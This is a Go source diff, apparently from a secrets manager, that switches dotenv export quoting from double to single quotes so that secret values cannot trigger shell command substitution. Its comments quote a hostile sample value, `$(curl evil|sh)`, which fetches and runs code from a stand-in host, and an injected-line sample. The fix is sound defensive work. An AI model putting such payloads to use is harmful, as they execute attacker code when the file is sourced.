@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"io"
 	"os"
+	"regexp"
 	"strings"
 	"syscall"
 	"time"
@@ -222,6 +223,26 @@ func fetchSecretValues(ctx context.Context, rc *common.RemoteClient, list []stru
 // "FOO\nINJECTED=evil" inject an extra, attacker-controlled KEY=VALUE line into an
 // artifact downstream tooling (docker run --env-file, CI --env-file) treats as fully
 // trusted. Refuse the export instead of silently producing an unsafe file.
+// dotenvPlainSafe matches values that need no quoting at all in the emitted
+// dotenv file: alnum plus a small allowlist of punctuation that's common in
+// real secret values (paths, URLs, timestamps) and carries no shell meaning.
+// Mirrors integrations/github-action/entrypoint.sh's write_output_file, which
+// uses the identical allowlist for the identical reason.
+var dotenvPlainSafe = regexp.MustCompile(`^[A-Za-z0-9_.,:/@+-]*$`)
+
+// writeDotenv emits KEY=VALUE lines. This file's own docs (and every dotenv
+// consumer convention, e.g. `set -a && . .env && set +a`) treat sourcing the
+// output with a shell as a real, documented consumption path, not a
+// hypothetical misuse. Any value outside dotenvPlainSafe is wrapped in SINGLE
+// quotes — the only POSIX-shell quoting form that suppresses ALL expansion
+// (command substitution $()/backtick, parameter/arithmetic expansion,
+// globbing, tilde expansion) — with only the literal single-quote character
+// escaped via the standard close-escape-reopen idiom ('\”). A prior revision
+// double-quoted non-plain values, which does NOT suppress $()/backtick
+// command substitution: a secret value containing e.g. `$(curl evil|sh)`
+// survived into the file unneutralized and would execute if later sourced
+// (adversarial-review integrations-github-action.json#2, the sibling gap this
+// closes — see entrypoint.sh's write_output_file for the bash precedent).
 func writeDotenv(w io.Writer, secrets []exportedSecret) error {
 	for _, s := range secrets {
 		if strings.ContainsAny(s.Name, "\r\n") {
@@ -231,8 +252,8 @@ func writeDotenv(w io.Writer, secrets []exportedSecret) error {
 	fmt.Fprintf(w, "# Exported by Keyorix — %s\n", time.Now().Format("2006-01-02")) //nolint:errcheck
 	for _, s := range secrets {
 		val := s.Value
-		if strings.ContainsAny(val, " \t\n\"'=\\") {
-			val = `"` + strings.ReplaceAll(strings.ReplaceAll(val, `\`, `\\`), `"`, `\"`) + `"`
+		if !dotenvPlainSafe.MatchString(val) {
+			val = "'" + strings.ReplaceAll(val, `'`, `'\''`) + "'"
 		}
 		fmt.Fprintf(w, "%s=%s\n", s.Name, val) //nolint:errcheck
 	}
